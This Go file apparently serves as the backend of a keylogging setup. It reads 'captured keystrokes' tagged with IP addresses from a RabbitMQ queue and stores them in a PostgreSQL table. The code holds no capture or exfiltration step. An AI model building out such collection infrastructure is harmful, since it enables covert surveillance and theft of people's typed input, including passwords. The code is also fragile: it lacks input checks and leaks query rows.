package main

import (
	"database/sql"
	"log"
	"os"
	"strings"

	_ "github.com/lib/pq"
	"github.com/streadway/amqp"
)

func main() {
	// Store captured keystrokes in database
	db, err := sql.Open("postgres", os.Getenv("PSQL_CONN"))
	if err != nil {
		log.Fatalf("Error connecting to database: %v\n", err)
	}
	defer db.Close()
	err = db.Ping()
	if err != nil {
		log.Fatalf("Error connecting to database: %v\n", err)
	}
	log.Println("Connected to database")

	// Receive keystrokes
	amqpConn, err := amqp.Dial(os.Getenv("RABBITMQ_URI"))
	if err != nil {
		log.Fatalf("Error connecting to RabbitMQ: %v", err)
	}
	defer amqpConn.Close()
	channelAmqp, err := amqpConn.Channel()
	if err != nil {
		log.Fatalf("Error creating RabbitMQ channel: %v", err)
	}
	forever := make(chan bool)
	msgs, err := channelAmqp.Consume(
		os.Getenv("RABBITMQ_QUEUE"),
		"",
		true,
		false,
		false,
		false,
		nil,
	)
	if err != nil {
		log.Fatalf("Error consuming from queue: %v", err)
	}

	go func() {
		for d := range msgs {
			msg := strings.Split(string(d.Body), ":")
			ip, keystrokes := msg[0], msg[1]
			log.Printf("Received a message: %s", keystrokes)
			_, err = db.Query("INSERT into recordings(ip_address, time_stamp, keystrokes) VALUES($1, $2, $3);",
				ip, d.Timestamp, keystrokes)
			if err != nil {
				log.Fatalf("Error inserting row: %v", err)
			}
		}
	}()

	log.Printf("Waiting for messages")
	<-forever
}
